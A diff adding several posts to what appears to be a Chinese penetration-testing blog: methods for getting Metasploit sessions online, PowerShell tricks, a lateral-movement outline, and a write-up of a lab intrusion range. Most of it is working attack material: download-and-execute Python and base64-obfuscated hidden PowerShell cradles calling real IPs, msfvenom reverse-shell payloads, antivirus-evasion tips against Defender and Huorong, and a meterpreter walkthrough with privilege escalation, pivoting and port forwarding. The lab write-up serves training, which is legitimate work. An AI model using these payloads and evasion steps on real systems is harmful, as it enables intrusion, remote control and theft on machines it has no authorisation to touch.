@@ -227,6 +227,372 @@
             
 
   
+    <article id="post-咱就是说关于这个MSF上线的几种方式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="咱就是说关于这个MSF上线的几种方式"><a href="#咱就是说关于这个MSF上线的几种方式" class="headerlink" title="咱就是说关于这个MSF上线的几种方式"></a>咱就是说关于这个MSF上线的几种方式</h3><h4 id="0x00-gt-script上线"><a href="#0x00-gt-script上线" class="headerlink" title="0x00&gt; script上线"></a>0x00&gt; script上线</h4><p>MSF可以使用多种脚本语言进行上线，支持如下几种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">   3   Regsvr32</span><br><span class="line">   4   pubprn</span><br><span class="line">   5   SyncAppvPublishingServer</span><br><span class="line">   6   PSH (Binary)</span><br><span class="line">   7   Linux</span><br><span class="line">   8   Mac OS X</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>python：</strong></p>
+<p>使用python的好处是跨平台，linux还有Windows都能直接上线。不管是python上线还是powershell上线，defender都不会拦截，因此在目标机器上不存在其它杀软的情况时，不失为一种好的方法。</p>
+<p>（碰到rce命令执行时也可以放进去，做到无文件落地攻击，也方便进行一些后渗透）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">#默认就是python环境 自己选择一下</span><br><span class="line">set target 0</span><br><span class="line">#然后根据目标的实际情况设置payload</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp #tab补全 选择需要的payload</span><br><span class="line">run</span><br><span class="line">#生成的payload长这样</span><br><span class="line">python -c &quot;import sys;import ssl;u&#x3D;__import__(&#39;urllib&#39;+&#123;2:&#39;&#39;,3:&#39;.request&#39;&#125;[sys.version_info[0]],fromlist&#x3D;(&#39;urlopen&#39;,));r&#x3D;u.urlopen(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxxx:8080&#x2F;xQiVElQCMuq&#39;, context&#x3D;ssl._create_unverified_context());exec(r.read());&quot;</span><br><span class="line">#感兴趣可以去看看请求下载并执行的这段代码是什么</span><br></pre></td></tr></table></figure>
+
+<p><strong>powershell：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 2</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">#生成的payload长这样 是msf做的一些混淆</span><br><span class="line">powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADABsAHMAMQAyADsAJABlAHQAZQBqAHoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZQB0AGUAagB6AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZQB0AGUAagB6AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADgALgA2ADEALgAxADYAMgAuADEAMAAzADoAOAAwADgAMAAvAHcASwBOAEUAawBhAFoAUwBvAEUAUgAvADAAbQBYAEQAVgBzAGMAOADAAQgB0AFQAZAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADgALgA2ADEALgAxADYAMgAuADEAMAAzADoAOAAwADgAMAAvAHcASwBOAEUAawBhAFoAUwBvAEUAUgAnACkAKQA7AA&#x3D;&#x3D;</span><br><span class="line">#这里有个小提示 </span><br><span class="line">#关于-w hidden的选项 如果目标机器是Windows 且存在火绒，会进行拦截。但defender不会。</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x01-gt-linux可执行文件："><a href="#0x01-gt-linux可执行文件：" class="headerlink" title="0x01&gt; linux可执行文件："></a>0x01&gt; linux可执行文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f elf -o payload.elf</span><br><span class="line">use exploit&#x2F;multi&#x2F;handle</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">#然后启动一个文件服务器python3 -m http.server让目标机器去下载这个文件</span><br><span class="line">chmod +x .&#x2F;payload.elf</span><br><span class="line">nohup .&#x2F;payload.elf</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-gt-shellcode免杀上线"><a href="#0x02-gt-shellcode免杀上线" class="headerlink" title="0x02&gt; shellcode免杀上线:"></a>0x02&gt; shellcode免杀上线:</h4><p>如果目标机器上面有防护软件，需要生成shellcode进行免杀处理一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#linux shellcode </span><br><span class="line">msfvenom -a x86 --platform Linux -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f c </span><br><span class="line"></span><br><span class="line">#windows shellcode</span><br><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP  LPORT&#x3D;攻击机端口 -f c</span><br><span class="line"></span><br><span class="line">#将shellcode进行免杀处理过的exec传到文件服务器下，让目标机器下载</span><br><span class="line">#windows环境下推荐使用powershell执行远程脚本文件</span><br><span class="line"></span><br><span class="line">#下载完后关闭窗口（隐藏下载）会被火绒拦截</span><br><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http:&#x2F;&#x2F;158.247.197.41:8000&#x2F;1.ps1&#39;,&#39;c:&#x2F;11.ps1&#39;)</span><br><span class="line">#注意-w 也就是-windowstyle 设置后 会在执行完命令默认关闭窗口 而这个行为可能会被杀软拦截掉</span><br><span class="line">#下载完不关闭窗口  推荐使用 不会拦截 但容易被发现 记得迁移进程还有做权限维持</span><br><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http:&#x2F;&#x2F;158.247.197.41:8000&#x2F;1.ps1&#39;,&#39;c:&#x2F;11.ps1&#39;)</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/21/%E5%92%B1%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%85%B3%E4%BA%8E%E8%BF%99%E4%B8%AAMSF%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-渗透测试中Power Shell的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="渗透测试中Power-Shell的使用"><a href="#渗透测试中Power-Shell的使用" class="headerlink" title="渗透测试中Power Shell的使用"></a>渗透测试中Power Shell的使用</h3><h4 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h4><p>一个PowerShell脚本其实就是—个简单的文本文件,其扩展名为.ps1。每个脚本中包含一系列powershell命令，每个命令显示为独立的一行。</p>
+<h4 id="执行策略："><a href="#执行策略：" class="headerlink" title="执行策略："></a>执行策略：</h4><p>渗透测试中可以使用下面的cmdlet命令设置PowerShell的执行策略，让它允许所有脚本运行。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted  <span class="comment">#需要管理员权限</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="运行脚本："><a href="#运行脚本：" class="headerlink" title="运行脚本："></a>运行脚本：</h4><p>运行脚本时路径里面不能用相对路径，只能是绝对路径或者在当前脚本下执行，比如输入./1.ps1。</p>
+<h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><h5 id="执行本地脚本文件"><a href="#执行本地脚本文件" class="headerlink" title="执行本地脚本文件"></a>执行本地脚本文件</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在本地绕过执行策略执行ps1脚本 （也就是不需要管理员权限去开启执行策略也可以执行） 推荐使用</span></span><br><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span>  Bypass  <span class="operator">-File</span> ./<span class="number">1</span>.ps1</span><br><span class="line"><span class="comment">#也可以这样</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Import-Module c:\Users\Lenovo\Desktop\1.ps1;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/20/gLhTCO3JbiHdmMr.png" alt="image-20211120224700486"></p>
+<h5 id="执行远程脚本文件"><a href="#执行远程脚本文件" class="headerlink" title="执行远程脚本文件"></a>执行远程脚本文件</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">win10测试成功</span><br><span class="line"><span class="comment">#下载完后关闭窗口（隐藏下载）会被火绒拦截</span></span><br><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> bypass <span class="literal">-noprofile</span> <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).downloadfile(<span class="string">&#x27;http://158.247.197.41:8000/1.ps1&#x27;</span>,<span class="string">&#x27;c:/11.ps1&#x27;</span>)</span><br><span class="line"><span class="comment">#注意-w 也就是-windowstyle 设置后 会在执行完命令默认关闭窗口 而这个行为可能会被杀软拦截掉</span></span><br><span class="line"><span class="comment">#下载完不关闭窗口  推荐使用 不会拦截 但容易被发现</span></span><br><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> bypass <span class="literal">-noprofile</span> <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).downloadfile(<span class="string">&#x27;http://158.247.197.41:8000/1.ps1&#x27;</span>,<span class="string">&#x27;c:/11.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADPower%20Shell%E7%9A%84%E4%BD%BF%E7%94%A8/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-内网横向" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><p>首先整理思路，在渗透过程中需要具有清晰的思路，内网渗透第一件事：</p>
+<p><strong>分析网络中有哪些主机：</strong></p>
+<ul>
+<li>了解网络信息：分析网络中有哪些主机（pc、server、打印机、邮服等等）</li>
+<li>扫描端口、分析服务</li>
+</ul>
+<p>接下来才是攻击服务：</p>
+<p><strong>攻击服务：</strong></p>
+<ol>
+<li>爆破密码</li>
+<li>系统漏洞</li>
+<li>欺骗</li>
+<li>钓鱼</li>
+</ol>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/20/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-暗月内网靶场项目7WP：" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="暗月内网靶场项目⑦WP："><a href="#暗月内网靶场项目⑦WP：" class="headerlink" title="暗月内网靶场项目⑦WP："></a>暗月内网靶场项目⑦WP：</h3><p>攻击机：Kali 192.168.132.128</p>
+<h4 id="主机发现-端口扫描-服务识别-web打点-漏洞利用-："><a href="#主机发现-端口扫描-服务识别-web打点-漏洞利用-：" class="headerlink" title="主机发现  端口扫描  服务识别  web打点  漏洞利用 ："></a>主机发现  端口扫描  服务识别  web打点  漏洞利用 ：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.132.0&#x2F;24 </span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.132.2   00:50:56:f5:b9:e8      3     180  VMware, Inc.                                                                                                                                    </span><br><span class="line"> 192.168.132.138 00:0c:29:74:26:e7     17    1020  VMware, Inc.                                                                                                                                    </span><br><span class="line"> 192.168.132.254 00:50:56:e9:c7:68      2     120  VMware, Inc.</span><br><span class="line">masscan  192.168.132.138  -p 1-65535 --rate&#x3D;100  #先探测端口</span><br><span class="line">Discovered open port 21&#x2F;tcp on 192.168.132.138                                 </span><br><span class="line">Discovered open port 999&#x2F;tcp on 192.168.132.138                                </span><br><span class="line">Discovered open port 80&#x2F;tcp on 192.168.132.138                                 </span><br><span class="line">Discovered open port 5985&#x2F;tcp on 192.168.132.138                               </span><br><span class="line">Discovered open port 6588&#x2F;tcp on 192.168.132.138   </span><br><span class="line">nmap -sV -p -Pn 3389,5985,6588,999,21,80 -A 192.168.132.138 -oA attack-ports  #探测服务</span><br><span class="line">xsltproc -o attack.html mode.xsl attack-ports.xml #美化（可选）</span><br><span class="line">    PORT     STATE    SERVICE       VERSION</span><br><span class="line">    21&#x2F;tcp   open     ftp           Microsoft ftpd</span><br><span class="line">    | ftp-syst: </span><br><span class="line">    |_  SYST: Windows_NT</span><br><span class="line">    80&#x2F;tcp   open     http          Microsoft IIS httpd 10.0</span><br><span class="line">    |_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">    |_http-title: IIS Windows Server</span><br><span class="line">    999&#x2F;tcp  open     http          Microsoft IIS httpd 10.0</span><br><span class="line">    | http-robots.txt: 1 disallowed entry </span><br><span class="line">    |_&#x2F;</span><br><span class="line">    |_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">    |_http-title: phpMyAdmin</span><br><span class="line">    3389&#x2F;tcp filtered ms-wbt-server</span><br><span class="line">    5985&#x2F;tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">    |_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">    |_http-title: Not Found</span><br><span class="line">    6588&#x2F;tcp open     http          Microsoft IIS httpd 10.0</span><br><span class="line">    | http-cookie-flags: </span><br><span class="line">    |   &#x2F;: </span><br><span class="line">    |     ASPSESSIONIDSCQSQCSR: </span><br><span class="line">    |_      httponly flag not set</span><br><span class="line">    |_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">    |_http-title: \xBB\xA4\xCE\xC0\xC9\xF1\xA1\xA4\xD6\xF7\xBB\xFA\xB4\xF3\xCA\xA6 V3.5.1 - \xC7\xB0\xCC\xA8\xB5\xC7\xC2\xBC</span><br><span class="line">    MAC Address: 00:0C:29:74:26:E7 (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Microsoft Windows 2016</span><br><span class="line">    OS CPE: cpe:&#x2F;o:microsoft:windows_server_2016</span><br><span class="line">    OS details: Microsoft Windows Server 2016</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line">访问80web：发现robost.txt  识别出指纹siteserver</span><br><span class="line">利用密码重置漏洞登录后台：</span><br><span class="line">利用后台文件上传漏洞getshell：</span><br><span class="line">蚂蚁连接一下，上传免杀exe 得到msfsession</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.132.128</span><br><span class="line">    lhost &#x3D;&gt; 192.168.132.128</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">    [*] Started reverse TCP handler on 192.168.132.128:4444 </span><br><span class="line">    [*] Sending stage (200262 bytes) to 192.168.132.138</span><br><span class="line">    [*] Meterpreter session 1 opened (192.168.132.128:4444 -&gt; 192.168.132.138:50620) at 2021-11-17 10:32:45 -0500</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">#信息收集  提升权限</span><br><span class="line">getsystem</span><br><span class="line">#获取网段  自动路由 主机存活</span><br><span class="line">	meterpreter &gt; run autoroute -s 10.10.1.0&#x2F;24</span><br><span class="line">	meterpreter &gt; run get_local_subnets</span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">    [!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">    Local subnet: 10.10.1.0&#x2F;255.255.255.0</span><br><span class="line">    Local subnet: 192.168.132.0&#x2F;255.255.255.0</span><br><span class="line">    meterpreter &gt; run arp_scanner -r 10.10.1.0&#x2F;24</span><br><span class="line">    [*] ARP Scanning 10.10.1.0&#x2F;24</span><br><span class="line">    [*] IP: 10.10.1.128 MAC 00:0c:29:74:26:f1</span><br><span class="line">    [*] IP: 10.10.1.130 MAC 00:0c:29:47:d3:50</span><br><span class="line">    [*] IP: 10.10.1.254 MAC 00:50:56:f2:99:e5</span><br><span class="line">    [*] IP: 10.10.1.255 MAC 00:0c:29:74:26:f1</span><br><span class="line">#socks代理 端口扫描  服务探测</span><br><span class="line">search socks </span><br><span class="line">use 0</span><br><span class="line">set srvhost</span><br><span class="line">run</span><br><span class="line">vim &#x2F;etc&#x2F;proxychains4</span><br><span class="line">proxychains masscan  192.168.132.138  -p 1-65535 --rate&#x3D;100  #先探测端口</span><br><span class="line">proxychains nmap -sT -sV -Pn -n -p  80,139,445,21,3389,3306  --script&#x3D;smb-vuln-ms* 192.168.132.133 #代理的情况下这样写不然会报错 </span><br><span class="line"></span><br><span class="line">    PORT     STATE  SERVICE       VERSION</span><br><span class="line">    21&#x2F;tcp   closed ftp</span><br><span class="line">    80&#x2F;tcp   open   http          nginx</span><br><span class="line">    139&#x2F;tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">    445&#x2F;tcp  open   microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">    3306&#x2F;tcp closed mysql</span><br><span class="line">    3389&#x2F;tcp closed ms-wbt-server</span><br><span class="line">    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">    Host script results:</span><br><span class="line">    |_smb-vuln-ms10-054: false</span><br><span class="line">    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">或者使用msf进行端口扫描  search portscan  use tcpscan  show options  速度比masscan快很多</span><br><span class="line">    msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; run</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:80 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:110 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:135 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:139 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:445 - TCP OPEN</span><br><span class="line">发现存在80web服务:</span><br><span class="line">#端口转发  漏洞利用</span><br><span class="line">portfwd add -l 80 -p 80 -r 10.10.1.132</span><br><span class="line">meterpreter &gt; portfwd add -l 80 -p 80 -r 10.10.1.130</span><br><span class="line">[*] Local TCP relay created: :80 &lt;-&gt; 10.10.1.130:80</span><br><span class="line">本地访问  发现是通达oa  搜索exp  通过任意文件上传getshell  